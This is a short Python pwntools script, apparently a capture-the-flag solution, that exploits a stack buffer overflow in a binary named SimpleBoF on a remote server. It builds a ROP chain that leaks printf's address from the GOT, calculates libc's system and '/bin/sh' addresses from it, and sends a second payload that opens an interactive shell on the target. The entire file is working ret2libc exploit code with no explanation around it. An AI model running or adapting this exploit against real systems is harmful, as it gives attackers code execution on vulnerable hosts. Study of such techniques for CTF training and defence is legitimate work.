from pwn import *

e = ELF("./SimpleBoF")
l = ELF("./libc-2.19.so")
p = remote("103.237.99.35", 29003)
#context.log_level = 'DEBUG'
#p = process("./SimpleBoF")

ret = int(0x400431)
pop_rdi = int(0x400623)

printf_plt = e.symbols['printf']
got_addr = e.symbols['got.printf']

printf_off = l.symbols['printf']
binsh_off = next(l.search("/bin/sh"))
system_off = l.symbols['system']
main = e.symbols['main']
'''
payload = 'A'*0x28+p64(pop_rdi)+p64(got_addr)+p64(printf_plt)+p64(main)
p.sendline(payload)
p.sendline("haha")
print p.recvuntil("Y")
#p.interactive()
#print p.recvline()
#print p.recv(6) + "\x00\x00"
'''
payload = 'A'*(0x20+8)+p64(pop_rdi)+p64(got_addr)+p64(printf_plt)+p64(main)

#f = open("./tmp", "w")
#f.write(payload)
p.sendline(payload)
p.recvuntil("\n")

data = p.recv(6)+'\x00\x00'
printf_addr = u64(data)
system_addr = printf_addr - printf_off + system_off
binsh_addr = printf_addr - printf_off + binsh_off

log.info("printf_addr = "+hex(u64(data)))
log.info("system_addr = "+hex(system_addr))
log.info("binsh_addr = "+hex(binsh_addr))

payload = 'A'*(0x20+8)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)
p.sendline(payload)
p.interactive()
